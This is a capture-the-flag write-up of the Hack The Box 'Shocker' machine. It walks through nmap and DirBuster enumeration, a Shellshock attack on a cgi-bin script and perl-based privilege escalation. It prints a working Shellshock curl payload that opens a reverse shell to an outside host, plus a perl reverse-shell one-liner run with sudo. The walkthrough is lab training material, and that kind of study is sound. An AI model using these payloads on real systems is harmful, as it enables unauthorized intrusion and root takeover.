@@ -1,0 +1,146 @@
+I"� <p>In this Hack The Box, we’ll be using DirBuster to look for hidden directories, and we’ll get to use the shellscript exploit to gain access to the box–all without using Metasploit, so let’s begin!</p>
+
+<h2 id="hack-the-box">Hack The Box</h2>
+
+<ul>
+  <li>Operating System: Linux</li>
+  <li>Difficulty: Easy</li>
+</ul>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Let’s start with the good ol’ nmap scan.</p>
+
+<p><img src="/images/blog/shocker/nmapscan.jpg" alt="nmap scan" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 
+                       (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>From the results, we can see that port 80 is open, so let’s see what we can find.</p>
+
+<h3 id="website-information">Website Information</h3>
+
+<p>In the web browser, I went to <code class="language-plaintext highlighter-rouge">10.10.10.56</code>. Hah, look what’s on the front page.</p>
+
+<p><img src="/images/blog/shocker/website.jpg" alt="front page of website" /></p>
+
+<p>Next, I checked the source code and the HTTP headers using Burp Suite–nothing.</p>
+
+<p>I decided to use DirBuster since I wasn’t having any luck.</p>
+
+<h3 id="dirbuster">DirBuster</h3>
+
+<p>To access DirBuster, in terminal type in <code class="language-plaintext highlighter-rouge">dirbuster</code>, and it should open the program. I used the medium wordlist file located in:</p>
+
+<p><strong>/usr/shared/wordlists/dirbuster/directory-list-2.3-medium.txt</strong></p>
+
+<p>Here are the results:</p>
+
+<p><img src="/images/blog/shocker/dirbuster.jpg" alt="dirbuster results" /></p>
+
+<p>I tried to access /icons, no luck. That said, what’s interesting is the cgi-bin directory that DirBuster has found. Since cgi-bin is a folder that can be used to house scripts.. I wonder if there’s any scripts in that folder.</p>
+
+<p>I reran DirBuster, but this time added the file extensions: <strong>sh, pl, py, and rb</strong>.</p>
+
+<p><img src="/images/blog/shocker/dirbustershell.jpg" alt="dirbuster results with shell script" /></p>
+
+<p>Here we go, it looks like we found a <strong>user.sh</strong> file, which confirms that the cgi-bin does allow for scripts to run. Meaning, we can try to send a shell script over to gain access to the machine.</p>
+
+<h3 id="using-nmap-scripts">Using Nmap Scripts</h3>
+
+<p>Since we’ve confirmed that the cgi-bin directory can execute shell scripts, I did some investigating and found out about the shellshock vulnerability. Here’s what I found:</p>
+
+<p><em>Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access to many Internet-facing services, such as web servers, that use Bash to process requests.</em></p>
+
+<p>You can learn more about it here: <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Wikipedia - Shellshock (Software Bug)</a></p>
+
+<p>Before using it, I wanted to verify that this HTB is vulnerable to shellshock, so I used a nmap script. To find the script in Kali Linux use the <code class="language-plaintext highlighter-rouge">locate</code> command. Once found, you can use the <code class="language-plaintext highlighter-rouge">cp</code> command to copy it to your current directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>root@kali:~# locate http-shellshock
+/usr/share/nmap/scripts/http-shellshock.nse
+root@kali:~# cp /usr/share/nmap/scripts/http-shellshock.nse /root/HTB/Shocker
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Before using it, I edited the file by using the <code class="language-plaintext highlighter-rouge">gedit</code> command and removed the line:</p>
+
+<p><code class="language-plaintext highlighter-rouge">options["header"][cmd] = cmd</code></p>
+
+<p>Then we can go ahead and run the script..</p>
+
+<p><img src="/images/blog/shocker/nmapscript.jpg" alt="nmap script results" /></p>
+
+<p>..Yes! Confirmed that this box might be vulnerable to shellshock, so let’s use it.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Before moving forward with exploitation, let’s recap what we know so far:</p>
+
+<ul>
+  <li>In the nmap scan, we found out that port 80 is open.</li>
+  <li>In DirBuster we saw the cgi-bin directory that contained a user.sh file.</li>
+  <li>The above tells us that the cgi-bin directory can store and execute shell scripts.</li>
+  <li>Confirmed that port 80 is vulnerable to the shellscript exploit by running a nmap script.</li>
+</ul>
+
+<p>Okay, now that we know the above. Let’s start our exploit!</p>
+
+<h3 id="shellscript-exploit">Shellscript Exploit</h3>
+
+<p>To start with the shellscript exploit, we’re going to do the following:</p>
+
+<p>Enter this command in one terminal window:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>curl -H "User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.31/4444 0&gt;&amp;1" http://10.10.10.56:80/cgi-bin/user.sh
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And then open a netcat listener in another terminal window, <code class="language-plaintext highlighter-rouge">nc -lnvp 4443</code></p>
+
+<p><img src="/images/blog/shocker/shellscript.jpg" alt="shellscript exploit" /></p>
+
+<p>Would you look at that–it worked! It looks like we have access to Shelly’s account. Let’s see what type of privileges Shelly has by using the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>
+
+<p><img src="/images/blog/shocker/shelly.jpg" alt="shelly privileges" /></p>
+
+<p>It looks like Shelly can run a perl script, so we can see if we can get a reverse shell using perl.</p>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>I like to use Pentest Monkey’s cheat sheet to find a reverse shell suing perl. The cheat sheet can be found here: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>sudo perl -e 'use Socket;$i="10.10.14.31";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Before executing the command, we’ll want to create a Netcat listener first in another terminal window by typing <code class="language-plaintext highlighter-rouge">nc -lnvp 4444</code></p>
+
+<p><img src="/images/blog/shocker/pescalation.jpg" alt="privilege escalation" /></p>
+
+<p>We did it! We can use the <code class="language-plaintext highlighter-rouge">whoami</code> command to verify root access, and we do. Congrats! We now have access to the Shocker HTB. From here, we can locate the root.txt and user.txt file to grab the flags.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Running DirBuster on web servers is extremely helpful because it’ll find directories that you wouldn’t normally see when you first go to a website. In this box, we were able to locate the cgi-bin directory which housed scripts. Once we found that out, we were able to upload and execute our own scripts to gain root access.</p>
+:ET
